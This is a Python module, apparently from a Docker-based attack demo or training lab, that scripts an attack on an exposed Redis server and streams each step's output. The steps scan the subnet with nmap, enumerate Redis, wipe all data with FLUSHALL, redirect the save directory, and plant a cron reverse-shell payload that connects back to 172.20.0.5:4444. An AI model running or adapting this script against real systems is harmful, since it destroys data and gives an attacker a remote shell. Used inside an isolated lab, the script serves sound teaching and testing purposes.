import asyncio
from datetime import datetime
from models.attack import AttackRun


ATTACK_STEPS = [
    {
        "label": "Network discovery: scanning 172.20.0.0/24 for port 6379",
        "cmd": [
            "docker", "exec", "attacker",
            "nmap", "-sV", "-p", "6379", "--open", "172.20.0.0/24"
        ],
    },
    {
        "label": "Connecting to redis-target: PING",
        "cmd": [
            "docker", "exec", "attacker",
            "redis-cli", "-h", "redis-target", "PING"
        ],
    },
    {
        "label": "Enumerating Redis server info",
        "cmd": [
            "docker", "exec", "attacker",
            "redis-cli", "-h", "redis-target", "INFO", "server"
        ],
    },
    {
        "label": "Listing all keys before flush",
        "cmd": [
            "docker", "exec", "attacker",
            "redis-cli", "-h", "redis-target", "KEYS", "*"
        ],
    },
    {
        "label": "FLUSHALL: wiping all Redis data",
        "cmd": [
            "docker", "exec", "attacker",
            "redis-cli", "-h", "redis-target", "FLUSHALL"
        ],
    },
    {
        "label": "CONFIG SET dir /tmp (pivot for file write)",
        "cmd": [
            "docker", "exec", "attacker",
            "redis-cli", "-h", "redis-target", "CONFIG", "SET", "dir", "/tmp"
        ],
    },
    {
        "label": "Writing cron backdoor payload via SET",
        "cmd": [
            "docker", "exec", "attacker",
            "redis-cli", "-h", "redis-target",
            "SET", "backdoor",
            "*/1 * * * * root bash -i >& /dev/tcp/172.20.0.5/4444 0>&1"
        ],
    },
    {
        "label": "Verifying backdoor key written",
        "cmd": [
            "docker", "exec", "attacker",
            "redis-cli", "-h", "redis-target", "GET", "backdoor"
        ],
    },
]


async def run(run: AttackRun, broadcast_fn) -> None:
    for step in ATTACK_STEPS:
        await broadcast_fn(f"[>] {step['label']}")
        proc = await asyncio.create_subprocess_exec(
            *step["cmd"],
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            text = line.decode(errors="replace").rstrip()
            run.output.append(text)
            await broadcast_fn(text)
        await proc.wait()

    run.finished_at = datetime.utcnow()
    run.exit_code = 0
    run.status = "success"
    run.duration_seconds = (run.finished_at - run.started_at).total_seconds()
    await broadcast_fn(
        f"[+] ATTACK COMPLETE  exit_code=0  duration={run.duration_seconds:.1f}s"
    )
